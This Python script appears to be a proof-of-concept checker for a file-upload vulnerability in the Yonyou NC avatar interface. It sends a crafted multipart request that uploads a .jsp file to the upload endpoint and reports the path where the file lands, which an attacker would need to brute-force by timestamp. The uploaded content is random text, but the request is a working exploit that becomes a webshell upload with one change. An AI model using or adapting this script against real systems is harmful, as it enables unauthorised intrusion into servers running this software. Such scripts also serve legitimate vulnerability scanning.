import requests
import urllib

from inc.generate_random import generate_random_str


def verify(url):
    relsult = {
        'name': '用友NC-avatar接口存在文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ',
        'User-Agent': 'Mozilla/5.0'
    }
    char_data = generate_random_str(10)
    data = f'''------WebKitFormBoundaryEXmnamw5gVZG9KAQ
    Content-Disposition: form-data; name="file"; filename="111.jsp"
    Content-Type: application/octet-stream

    {char_data}
    ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--'''
    vurl = urllib.parse.urljoin(url, "/uapim/upload/avatar?usercode=1&fileType=jsp")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'true' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = f'需要爆破路径{url}/uapim/static/pages/photo/1/1.[13位时间戳].jsp'
        return relsult

    except:
        return relsult

verify('1')